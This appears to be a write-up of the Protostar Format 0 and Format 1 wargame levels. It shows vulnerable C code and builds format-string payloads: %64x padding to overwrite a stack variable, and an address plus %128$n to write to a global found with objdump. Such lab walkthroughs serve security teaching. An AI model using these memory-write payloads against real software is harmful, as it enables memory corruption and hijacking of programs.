# Protostar Format levels

## Format 0
For this level we have to exploit the following C code.

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

These types of challenges require a deep understanding of printf. I recommend reading the `man printf` page, especially the format modifiers **%x, %n and adding to them, such as %100x and %4$x**

This challenge is similar to a buffer overflow attack, where we are required to override a value with a certain value. Clearly we can just enter 64 characters followed by 0xdeadbeef (split for *little endianness* ofcourse). However the challenge wants this done in less than 15 characters. 

The way we can do this is by using the format modifier `%64x`. This would adding 64 bytes of padding to our string, followed by 0xdeadbeef, this would result in 64 characters being printed. Like we need.

So let's generate our output with python
```python
print '%64x' + '\xef\xbe\xad\xde'
```

## Format 1

This challenges introduces the `%n` modifier, that allows us to write to any value in memory. Keep this idea in main, as it will allow us later to execture our own code.

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

Firstly we can find the address of target using *objdump*
```
objdump -t program | grep target
```
This prints the address of target in memory -> **0x08049638**. Now that we have an address to overwrite, how do we do that?

Well first we need to find what offset our input string is on the stack for printf.
This can be found by AAAA %p %p.... %p a bunch of times. I find it is the 128th item on the stack

So let's generate a script. We need to put the address on the stack so:
```attack = "\x38\x96\x04\x08```

Now we need to set the variable, we can use %n for this. But we need the 128th item on the stack so we can use the $ modifier like
```attack += "%128$n"```
This will now overwrite the variable target, with with however many characters have already been written. (4 in this case).